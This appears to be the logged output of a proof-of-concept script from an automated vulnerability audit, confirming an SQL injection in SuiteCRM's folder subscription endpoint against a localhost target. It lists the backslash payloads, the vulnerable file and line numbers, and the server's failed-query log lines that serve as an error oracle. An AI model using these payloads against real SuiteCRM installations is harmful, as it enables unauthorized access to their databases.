@@ -1,0 +1,24 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-044/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-044/../.venv
+========================================================================
+VULN-044: folders subscription SQLi via unescaped backslash (deterministic error oracle)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin session + fresh non-admin user
+[OK] low-priv user mod_5f437596 logged in
+[STEP] sending 4 setFolderViewSelection POSTs (0, 1, 2, 3 trailing backslashes)
+[INFO] [baseline_0bs] ieIdShow[]='BASE590655df21' -> HTTP 200, body[:60]='<!DOCTYPE html>\n<html lang=\'en_us\'>\n<head>\n    <link rel="SH'
+[INFO] [odd_1bs] ieIdShow[]='ODD-10c7698dbdf\\' -> HTTP 200, body[:60]='<!DOCTYPE html>\n<html lang=\'en_us\'>\n<head>\n    <link rel="SH'
+[INFO] [even_2bs] ieIdShow[]='EVEN-2ec31c1f4b5\\\\' -> HTTP 200, body[:60]='<!DOCTYPE html>\n<html lang=\'en_us\'>\n<head>\n    <link rel="SH'
+[INFO] [odd_3bs] ieIdShow[]='ODD-350abe56a47\\\\\\' -> HTTP 200, body[:60]='<!DOCTYPE html>\n<html lang=\'en_us\'>\n<head>\n    <link rel="SH'
+[STEP] grepping suitecrm.log for each marker (oracle read-back, not the attack)
+[INFO] [baseline_0bs] backslashes=0 expect_error=False found_error=False
+[INFO] [odd_1bs] backslashes=1 expect_error=True found_error=True
+[INFO]     log line: Mon Sep 28 2026 at 20:31:12 [17][216f2091-b83f-43f7-8449-4499772ff6f0][FATAL]  Query Failed: SELECT * FROM folders WHERE folders.id LIKE "ODD-10c7698dbdf\" OR folders.parent_folder LIKE "ODD-10c7698dbdf\": MySQL error 10
+[INFO] [even_2bs] backslashes=2 expect_error=False found_error=False
+[INFO] [odd_3bs] backslashes=3 expect_error=True found_error=True
+[INFO]     log line: Mon Sep 28 2026 at 20:31:12 [17][216f2091-b83f-43f7-8449-4499772ff6f0][FATAL]  Query Failed: SELECT * FROM folders WHERE folders.id LIKE "ODD-350abe56a47\\\" OR folders.parent_folder LIKE "ODD-350abe56a47\\\": MySQL erro
+[INFO] oracle evidence written to evidence/oracle_log_lines.txt
+[PROOF] backslash-count PARITY deterministically and repeatably (2 independent odd cases, 1 even case, 1 baseline) controls whether the constructed SQL statement is a syntax error -- an attacker-controlled boolean-style oracle proving raw interpolation into the query, exactly as EmailUIAjax.php:76-79 has no $db->quote()/quoted() call.
+[INFO] Exfiltration depth: constrained by design (see writeup.md) -- $f is duplicated into BOTH LIKE clauses with the identical value and no quote character is reachable (securexss rewrites '"' to &quot;), so this primitive proves injection but does not by itself extract data; marking CONFIRMED for the injection primitive per the assigned scope.
+==> VULN-044: CONFIRMED — low-priv user mod_5f437596: 2/2 odd-backslash payloads -> MySQL error 1064 in suitecrm.log, 2/2 even/baseline payloads -> clean parse, 100% reproducible
